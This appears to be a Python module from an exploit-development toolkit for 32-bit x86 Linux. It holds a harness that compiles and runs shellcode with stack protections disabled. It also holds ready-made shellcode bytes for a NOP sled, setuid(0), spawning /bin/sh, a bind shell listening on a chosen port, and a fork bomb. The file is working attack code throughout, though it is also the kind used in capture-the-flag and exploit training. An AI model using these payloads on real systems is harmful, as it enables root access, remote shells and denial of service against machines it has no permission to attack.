#!/bin/python3

from payload import *
from subprocess import call, Popen
import struct


# TODO make a version for x86-64


# Run a shellcode
def test(sc, remove=True):
    code = "void main(void) { char sc[] = \""

    for c in sc:
        code += "\\x" + hex(c)[2:]

    code += "\"; void(*ptr)(); ptr = (void*) sc; ptr(); }"

    fd = open("/tmp/shellcode.c", "w")
    fd.write(code)
    fd.flush()
    fd.close()

    call(["/usr/bin/gcc",
          "-m32", "-z", "execstack", "-fno-stack-protector",
          "/tmp/shellcode.c", "-o", "/tmp/shellcode"])

    info("run shellcode...")
    p = Popen(["/tmp/shellcode"])
    ret = p.wait()

    info("exit status: %d" % ret)

    if ret == -11:
        warn("Segmentation Fault !")

    if remove:
        os.remove("/tmp/shellcode.c")
        os.remove("/tmp/shellcode")
    else:
        info("file /tmp/shellcode.c and /tmp/shellcode saved")


def slednop(nb):
    return b"\x90" * nb


def jump(offset):
    if offset + 2 < 256:
        info("jump took 2 bytes")
        return b"\xeb" + setbyte(offset + 2)
    info("jump took 5 bytes")
    return b"\xe9" + set32(offset)


def setuid0():
    return b"\x31\xc0\x31\xdb\x31\xc9\xb0\x17\xcd\x80"


def exit():
    # 6 bytes
    """
    BITS 32
    xor eax, eax
    inc al
    int 0x80"""
    return b"\x31\xc0\xfe\xc0\xcd\x80"


# If you want to execute a shell and the stdin is a pipe,
# this shellcode reset the stdin to /dev/tty
def restoretty():
    # 45 bytes
    """
    BITS 32
    xor eax, eax
    xor ecx, ecx
    mov cl, 2       ; O_RDWR
    xor edx, edx    ; mode
    push eax
    push 0x7974742f
    push 0x7665642f
    mov ebx, esp    ; /dev/tty
    mov al, 5       ; open
    int 0x80
    
    push eax
    mov ebx, eax    ; fd src
    xor ecx, ecx    ; rewrite stdin
    mov al, 63      ; dup2
    int 0x80
    
    pop eax
    mov ebx, eax    ; fd src
    xor ecx, ecx
    mov cl, 1       ; rewrite stdout
    mov al, 63      ; dup2
    int 0x80"""
    return b"\x31\xc0\x31\xc9\xb1\x02\x31\xd2\x50\x68\x2f\x74" + \
           b"\x74\x79\x68\x2f\x64\x65\x76\x89\xe3\xb0\x05\xcd" + \
           b"\x80\x50\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x58\x89" + \
           b"\xc3\x31\xc9\xb1\x01\xb0\x3f\xcd\x80"


def shell():
    # 24 bytes
    """
    BITS 32
    xor eax, eax
    mov al, 0xb
    cdq
    push edx
    push 0x68732f6e
    push 0x69622f2f
    mov ebx, esp
    push edx
    push ebx
    mov ecx, esp
    int 0x80"""
    return b"\x31\xc0\xb0\x0b\x99\x52\x68\x6e\x2f\x73\x68\x68" + \
           b"\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80"
    

def remoteshell(port):
    # 73 bytes
    # http://shell-storm.org/shellcode/files/shellcode-836.php
    if port >= 65536 or port <= 0:
        die("port must be between 1-65535")
    data = struct.pack("h", port)
    p = struct.pack("bb", data[1], data[0])
    return b"\x31\xdb\xf7\xe3\xb0\x66\x43\x52\x53\x6a" + \
           b"\x02\x89\xe1\xcd\x80\x5b\x5e\x52\x66\x68" + p + \
           b"\x6a\x10\x51\x50\xb0\x66\x89\xe1\xcd\x80" + \
           b"\x89\x51\x04\xb0\x66\xb3\x04\xcd\x80\xb0" + \
           b"\x66\x43\xcd\x80\x59\x93\x6a\x3f\x58\xcd" + \
           b"\x80\x49\x79\xf8\xb0\x0b\x68\x2f\x2f\x73" + \
           b"\x68\x68\x2f\x62\x69\x6e\x89\xe3\x41\xcd\x80"


def forkbomb():
    # http://shell-storm.org/shellcode/files/shellcode-214.php
    return b"\x6a\x02\x58\xcd\x80\xeb\xf9"

